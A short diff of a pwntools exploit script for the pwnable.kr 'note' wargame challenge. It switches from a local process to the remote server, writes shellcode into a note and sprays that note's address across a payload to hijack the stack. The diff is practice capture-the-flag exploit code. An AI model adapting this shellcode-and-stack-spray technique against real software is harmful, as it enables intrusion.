@@ -50,12 +50,9 @@ def delete(no):
     p.recvuntil(b"exit\n")
 
 
-e = ELF("/root/Downloads/note")
-p = process(e.path, aslr=False)
-#
 p = remote("pwnable.kr", 9019)
 
-context.arch = e.arch
+context(arch="i386", os="linux")
 context.log_level = "warning"
 
 esp = 0xffffd360  # ebp-esp = 0x428 remote : 0xffffd360
@@ -69,11 +66,11 @@ sleep(10)
 p.recvuntil(b"exit\n")
 
 # create note, write shellcode
-no, add = create()
-write(no, shellcode)
+shell_no, shell_add = create()
+write(shell_no, shellcode)
 
-add = int(add, 16)
-pay = p32(add) * (4096 // 4)
+shell_add = int(shell_add, 16)
+pay = p32(shell_add) * (4096 // 4)
 
 while True:
     cnt += 1
